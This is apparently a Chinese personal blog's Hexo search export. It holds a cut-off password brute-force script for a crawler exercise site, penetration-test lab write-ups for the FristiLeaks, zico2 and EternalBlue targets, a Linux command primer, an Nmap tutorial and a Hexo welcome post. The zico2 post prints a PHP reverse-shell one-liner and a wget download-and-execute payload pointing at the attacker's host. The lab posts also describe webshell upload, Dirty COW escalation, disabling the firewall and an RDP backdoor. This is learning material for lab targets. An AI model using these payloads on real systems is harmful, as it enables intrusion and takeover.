print("输入的密码是："+str(i)) if "成功" in returnText.text: print("okok!") break browser.back()except Exception: print("出错了")#这个程序没有用三级结构导致如果程序出错，只能打印 ‘出错了 ’;如果用三级，则在except中还可以调用程序所在的函数。 用selenium通过浏览器把实现了自动化。 得到结果 总结： 最大的收获是调用POST方法时，得提交表单！ selenium中寻找元素的语法： find_element_by_id find_element_by_name find_element_by_tag_name 第三关闯关地址：http://www.heibanke.com/lesson/crawler_ex02/ 寻找目标： 对！没错！是找目标！刚看到第三关首页很懵逼，于是就注册了一个账号。之后会自动跳转到了下一个页面？？？什么鬼？乱点！！找不到思路的时候就去百度百度。知道退出后重新登录就找到目标了！呦西，比上一层多了两层保护！知道了又是找密码的题。至此，找到了目标！！！ 思路： 说实话不是看教程，我真不知道原理。此关的多两层防护就是指用session+cookie的验证。哎，session，cookie，token到底是啥？？（点击有惊喜）看完后还是有点迷，但做题够了。这道题就是用来session和cookie进行了登录验证。 1234567891011121314151617181920212223242526272829303132333435import requestsurl1='http://www.heibanke.com/lesson/crawler_ex02/'url2='http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex02/'message1=&#123;'username':'bsd123','password':'abc123'&#125;message2=&#123;'username':'zhangsan','password':1&#125;result1=requests.get(url1)if result1.status_code == 200: print('请登录！')#获取原始cookie值cookies1=result1.cookiesmessage1['csrfmiddlewaretoken']=cookies1['csrftoken']#allow_redirects=False这里有个不可控的因素页面可能会跳转到别的页面#csrftoken在表单里，在cookies中要出现一共两遍result2=requests.post(url2,allow_redirects=False,data=message1,cookies=cookies1) if result2.status_code == 200: print('登陆成功！')#获取新的cookiecookies2=result2.cookiesmessage2['csrfmiddlewaretoken']=cookies2['csrftoken']#尝试破解for i in range(31): message2['password']=i print(str(message2)) result3=requests.post(url1,data=message2,cookies=cookies2) if result3.status_code == 200: if '成功' in result3.text: print('成功了！') break else: print("失败了！") break 得到结果 对验证机制的理解： 总结：]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试（FristiLeaks）]]></title>
    <url>%2F2019%2F03%2F25%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88FristiLeaks%EF%BC%89%2F</url>
    <content type="text"><![CDATA[目的：获取最高shell权限 1.收集信息ip；端口；及其对应服务 2.发现仅有80端口，则打开浏览器浏览网页 3.发现页面无交互窗口，kali中遍历目录 4.发现遍历的目录都无效，猜测在URL后追加admin等一些特殊字符，也可以用首页中的字符信息测试 5.http://192.168.10.158/fristi/此网页可打开；打开后是登录窗口；基本操作无效后；一方面dirb此地址，另一方面看看两个页面的源代码找信息 6.在HTML中发现有可能是base64加密的图片，在kali中解码 7.用eezeepz / keKkeKKeKKeKkEkkEk登录成功 8.存在文件上传，猜测上传一个一句话木马，用菜刀连接 因为存在文件后缀限制，上传php文件会失败;用%00截断也行不通，虽然上传成功但菜刀没连上（Magic_quote_gpc可能没有off） 试通过1.php.png文件解析漏洞上传成功，并用菜刀连接，获取低级权限。 9.提权 上传反弹shell脚本php-reverse-shell.php.jpg(kali中/usr/share/webshells/php目录中自带的)；更改参数。 在kali中打开监听，在URL上执行，获取shell 转换到bash（shell）；查询信息，从kali下载脏牛，提权！ ## GET AND ASK SELF 学会对base64，加密解密成图片，会在Linux里查询查看图片。 解析漏洞（后续。。。） 对php-reverse-shell.php代码分析（后续。。。）]]></content>
      <tags>
        <tag>hack-text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[永恒之蓝-ms17_010]]></title>
    <url>%2F2019%2F03%2F24%2F%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010%2F</url>
    <content type="text"><![CDATA[永恒之蓝-ms17_010 目标：通过永恒之蓝（ms_17010）获取win server2008R2的最高权限，留下后门备下次再来。 简介： 永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。 SMB服务的作用：该服务在Windows与UNIX系列OS之间搭起一座桥梁，让两者的资源可互通有无，SMB服务详解：点击查看 影响版本：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 工具：msfconsole 已知条件：​ 由于我忘记了我win2008的密码，所以顺带着复现永恒之蓝顺便找回自己的密码哈哈哈。通过netdiscover发现ip为192.168.10.157；masscan开着445端口。 1.msf确定是否存在永恒之蓝漏洞 search ms17_010 use auxiliary/scanner/smb/smb_ms17_010 show options set RHOST exploit 2.展开进攻 use exploit/windows/smb/ms17_010_eternalblue show options set RHOST exploit 3.成功设置新用户，登录成功 4.登陆后的操作 关闭防火墙 打开远程桌面 开远程桌面的要求是3389端口开放，因为我的win2008 已开所以直接进攻 如果3389未开放？？ REG ADD HKLM\SYSTEM\CurrentControlset\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 特别注意:]]></content>
      <tags>
        <tag>hack-text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试（zico2）]]></title>
    <url>%2F2019%2F03%2F23%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88zico2%EF%BC%89%2F</url>
    <content type="text"><![CDATA[渗透测试（zico2） 目标：​ 对靶机进行测试，通过端口服务，漏洞或其他方式获取shell，并提升权限。 1.主机发现，端口发现，端口对应服务 扫描得到 80,22,111,53675 四个端口，以80,22为主进行后续测试 2.对80端口展开测试 在kali中dirb遍历网站目录–http://192.168.10.155/dbadmin/中有登陆界面，有弱口令admin登陆成功，并在数据库中发现敏感信息。 登陆浏览器发现无交互窗口，但还是在页面中发现一些信息—-点击进入，在URL中发现有可能含有文件包含。 文件包含出 /etc/passwd成功 文件包含+数据库导出phpinfo（）发现漏洞可利用。 3.根据80端口发现的文件包含漏洞展开攻击 在靶机的数据库中上传一个下载PHP脚本 kali上写一个shell.txt 在kali上同时打开临时HTTP服务和监听4444端口， 在URL上刷新，等待一段时间，连接到靶机 脏牛提权，在/tmp从kali下载dirty.c，并给予执行权限，执行脏牛，提权成功。后获取/bin/bash权限。 4.对22端口的测试 从数据库中爆破出的用户名、密码尝试 root 34kroot34 zico zico2215@ 用msfconsle字典爆破 5.日志清理 6.对第三步的强化理解 &lt;?php system(&quot;wget 192.168.10.149/shell.txt -O /tmp/shell.php php /tmp/shell.php&quot;);?&gt; 192.168.10.149是kali的ip；将其上传在靶机的数据库中，通过文件包含执行，wget命令从kali里下载shell.txt文件到靶机的 /tmp下并更名为shell.php，并执行shell.php文件. &lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt; ip依旧为kali的ip，通过上一个命令在拷贝过程中会执行此条语句，靶机会自动去连接kali的4444端口，并给一个/bin/sh(shell)。&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3中&lt;是输出；&gt;是输入；&amp;在后台运行；0是标准输入；1是标准输出；2表示标准错误信息输出。 python -m SimpleHTTPServer 80 开启临时80服务；此服务是为了方便靶机从kali上下在文件，所以在那个路径下开简单HTTP服务，则靶机就会从这个路径下下载文件。方便了大家，不用切换路径。 nc -nvlp 4444 在kali中监听4444端口 只有上述四步全部完成，才能去执行文件包含的URL！！！！ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 在反弹的/bin/sh中输入，获得bash（shell），得到bash的权利。 7.ASK SELF 对&lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt;中的‘&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’的理解？ 为什么在靶机数据库中不直接insert&lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt;，显得更方便？ 为什么非要用/bin/bash(shell)?为啥不在/bin/sh中直接脏牛？]]></content>
      <tags>
        <tag>hack-text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统基本命令小结]]></title>
    <url>%2F2018%2F12%2F11%2FLinux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Linux系统中的常用命令一、获得命令帮助信息： 获得命令的使用语法 获得命令的选项及功能解释 1.获得内部命令帮助信息：（一般为纯英文）help 内部命令 eg. 获得cd命令的帮助信息 2、获得外部命令帮助信息：（带有中文）外部命令 --help eg. 获得外部命令date的帮助信息 PS.内部命令与外部命令之区别： 内部命令存在于Linux系统的Shell中，而非磁盘中Shell被Linux系统加载到内存中，内部命令处于随时调用状态，用户可直接使用。 外部命令以文件形式存在：通常存放在硬盘中，外部命令主要在“/bin，/sbin”等目录中。 二、查看系统信息1、查看CPU信息：cat /proc/cpuinfo 2、查看内存情况：cat /proc/meminfo 3、查看系统内核版本：cat /proc/version 4、查看已加载的文件系统：cat /proc/mounts 5、查看系统日期：date 6、设置日期和时间（月日时分年.秒）date 121217002018.00 三、关机操作1、关闭系统：shutdown now poweroff init0 2、重启系统：shutdown -r now reboot init6 四、文件和目录操作：1、更改路径（cd）1）进入 某个目录例如：进入home目录 cd /home 2）返回上一级目录cd .. 3）进入个人的主目录cd ~用户主目录名 例如：cd ~user1 进入个人的主目录 4）返回上次所在的目录cd - 5）显示完整工作路径pwd 2、查看目录或文件：（ls）1）查看某目录下的文件或子目录：例如：查看/etc目录下的文件或子目录 ls /etc 查看结果中： 目录：深蓝色 文件：黑色或其它颜色 2）ls -F查看结果中： 目录：带斜杠“/” 文件：不带斜杠“/” 3）查看目录或文件的详细信息ls -l *开头的’d’表示是文件夹，其他则代表文件 4）显示具有隐藏属性的文件或目录ls -a 带点“.”的文件或目录均具有隐藏属性 3、创建、删除目录 特别说明： 在写目标路径时最前面若加 ‘ / ’ 说明从根目录开始。若不加则说明当前目录开始。这个很重要！！ 1）创建目录mkdir 目录1 [目录2] [目录3] … 2）创建目录树mkdir -p /一级目录名/二级目录名/三级目录名… 3）查看目录树（递归显示）ls -R /一级目录名 4）删除空目录（rmdir）空目录：该目录中无任何子目录或文件 rmdir 目录名 5）删除空目录树rmdir -p 一级目录名/二级目录名/三级/... 若无-p参数，想要删除一个目录树得一个个删除。 4、删除文件及目录（rm）1）删除文件rm 文件名及其路径 例如：删除1.txt文件（rm只能删除文件不能删除文件夹，系统会询问是否删除，输入yes即可） 2）删除文件及目录rm -rf 一级目录 -r：递归删除目录树（包含文件一并删除） -f：关闭人机会话（删除时，系统不再询问是否删除） 5、touch命令1）建立空文件touch 新文件名及路径 2）更新旧文件的创建时间标记touch 旧文件名及路径 6、修改或编辑文件内容gedit 文件名及路径 也可以通过vim（或vi）命令来编辑修改文件内容 7、mv命令1）重命名文件及目录mv 原文件名及路径 新文件名及路径 2个路径必须相同（若是不同路径，则为移动文件或目录） 将 1.txt ——&gt; 2.txt 2）移动文件或目录mv 源文件名及路径 新文件名及路径 2个路径必须不同 8、cp命令1）复制文件（原名复制）cp 源文件及路径 目标文件所在路径 可以使用星号“*”通配符，例如： 复制所有文件：cp /root/* /home/user1 复制同类型的所有文件：cp /root/*.txt /home/user1 2）复制文件（换名复制——源文件路径和目标文件路径相同）cp 源文件及路径 目标文件及路径 3）复制整个目录树（包含目录、子目录及文件）cp -R 源目录 目标目录 9、创建软链接文件软链接：相当于快捷方式（文件或目录均可以创建软链接） ln -s 源文件（目录）路径 软链接文件及路径 10、查找文件或目录（主要学习按名查找）find 指定查找路径 -name 指定查找的文件名及目录名 例如：在根目录下查找ifcfg-eth0文件 使用星号（*）可实现模糊查找 例如： 1）要查找文件名是ifcfg开头的文件 2）要查找文件类型是cfg的文件 五、文件的归档、压缩操作1、tar命令常见选项： -c：创建归档 -x：解归档 -v：显示过程 -f：指定文件名 -C：指定解归档的目录路径 -z：将打包文件压缩成gzip格式 -j：将打包文件压缩成bzip2格式 1）归档：即打包，常用于备份某个重要的目录 只归档不压缩 tar -cvf 创建的归档文件名及路径 要归档的目录 既归档、又压缩（gzip、bzip2压缩格式） tar -czvf 创建的归档压缩文件名及路径 要归档的目录 tar -cjvf 创建的归档压缩文件名及路径 要归档的目录 2）解归档 解归档到原路径 tar -xvf 归档文件名及路径 解归档到指定路径 tar -xvf 归档文件名及路径 -C 指定解归档的目录路径 解压缩、解归档 l 解压缩、解归档到原路径 tar -xzvf 归档压缩文件名及路径 例如：tar -xzvf /backup/root.tar.gz tar -xjvf 归档压缩文件名及路径 例如：tar -xjvf /backup/root.tar.bz2 l 解压缩、解归档到指定路径 tar -xzvf 归档压缩文件名及路径 -C 指定解归档的目录路径 例如：tar -xzvf /backup/root.tar.gz -C /backup tar -xjvf 归档压缩文件名及路径 -C 指定解归档的目录路径 例如：tar -xjvf /backup/root.tar.bz2 -C /backup2 2、gzip、bzip命令常见选项： -d：解压 1）压缩 gzip bzip 2）解压缩 gzip -d bzip -d]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap从入门到实践]]></title>
    <url>%2F2018%2F11%2F28%2FNmap%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[I. 写在前面 Nmap是什么？ ​ Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。 功能？ ​ 探测一组主机是否在线； ​ 扫描主机端口，嗅探所提供的网络服务； ​ 推断主机所用的操作系统 。 所用工具：下载官网链接： scanme.nmap.org ​ Nmap（命令行），wireshark，虚拟机（调试到仅主机模式） 如何获取Nmap？ ​ 最初Nmap是工作在Linux上的。如今Windows上也可以使用。 ​ 下载官网链接:Nmap ​ 在官网中选择合适的系统下载。（以Windows为例，下列讲解也以window为例） 一定要在官网中下载，从别的渠道得到的里面可能会有别人加的后门。 II. Nmap中的一些用法下载的Nmap可以用图形化界面操作，但我们根据Nmap前面提到的功能在命令行中对其命令进行相对应的分类。 Nmap可以扫描内网也可以扫描外网，此次以内网讲解。内网：在虚拟机中设定一活跃主机192.168.91.135。 代码中的\&lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网 1.主机发现（1）nmap -sL &lt;target&gt; ​ 仅仅是将IP段内主机列成一张表 ​ 这里的 \&lt; target &gt; 是一个ip段 （2）nmap -sP &lt;target&gt; ​ 局域网内：-sP参数原理为ARP扫描 （3）部分局域网和大多数公网都会设有防火墙，所以对策如下： ​ nmap -PS &lt;target&gt; (TCP SYS) ​ nmap -PA &lt;target&gt; (TCP ACK) ​ ##这两个命令在cmd中的所展现的是一样的，但所用的方法不同 ​ 局域网内：ARP扫描+常用的1000个TCP端口尝试建立连接 ​ 只有当扫描的到开机的主机，才会对此主机进行端口的扫描 2.端口扫描##端口的状态## open 开放的 close 关闭的 filtered 被防火墙过滤的 unfiltered 未被过滤的 open\filtered 开放或者被过滤的 closed\filtered 关闭或者被过滤的 （1）nmap -sS &lt;target&gt; ​ -sS为半连接，只进行TCP三次握手的前两次，所以相对较快。 （2）nmap -sT &lt;target&gt; ​ -sT命令为全连接，耗时较长。 （3）nmap -sU &lt;target&gt; ##Remark! ​ -Pn : 此参数可以绕过主机发现这一过程 ​ -p:次参数可以指定端口eg. Nmap -sS -p 80 192.168.91.135（扫描80端口） 3.版本探测（1）nmap -sV &lt;target&gt; （2） namp -O &lt;target&gt; ​ 操作系统判断 （3） namp -A &lt;target&gt; ​ 查询全部数据 III. 写在最后这是我第一次写这种学习后的所获文档。写出来总感觉还所缺陷，但又不知又从何处入手。内有不足欢迎大家指正。 Nmap是一个在做渗透测试时常用的信息收集软件。里面有许多各式各样的参数需要去学习，当然你如果全部把他们的功能背诵下来知道每个命令都可以干什么，那确实很棒。但现实…….哈哈哈，大家都一样，所以需要去总结，分类。本次我按其功能分为三类，详细如上。我在学习中也遇到了些许问题，例如：主机探测中的-PS -PA参数和端口探测中-sS -sT有何区别？？？我也很无语，还在查证中~~ 这个文档全部是以内网作为讲解，大家可以也可以拿着工具去公网上搞一波，测一测。练习虽好，但切记点到为止，公网安全需要大家共同维护！]]></content>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F11%2F25%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
